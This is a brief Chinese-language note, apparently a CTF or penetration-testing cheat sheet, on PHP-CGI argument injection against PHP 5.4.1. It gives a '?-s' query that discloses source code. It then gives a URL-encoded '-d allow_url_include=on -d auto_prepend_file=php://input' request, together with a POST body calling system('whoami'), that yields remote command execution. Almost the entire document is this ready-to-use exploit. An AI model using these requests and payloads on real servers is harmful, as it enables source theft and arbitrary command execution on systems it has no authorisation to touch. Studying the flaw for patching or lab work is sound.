# CGI源码泄露

`PHP` `5.4.1`

1. 利用CGI命令行参数查询源码
    
    > RFC3875 中规定，当请求参数不包含没有解码的=的情况下，要将请求参数作为cgi的参数传入
    > 
    
    ```jsx
    URL http://.../index.php?-s
    ```
    
2. 利用伪协议远程执行命令
    
    > 添加额外请求头
    > 
    
    ```jsx
    Content-Type : application/x-www-form-urlencoded
    ```
    
    ```jsx
    URL http://.../index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a
    ```
    
    > 解码: -d allow_url_include=on -d auto_prepend_file=php://input
    > 
    
    ```jsx
    POST <?php system('whoami');?>
    ```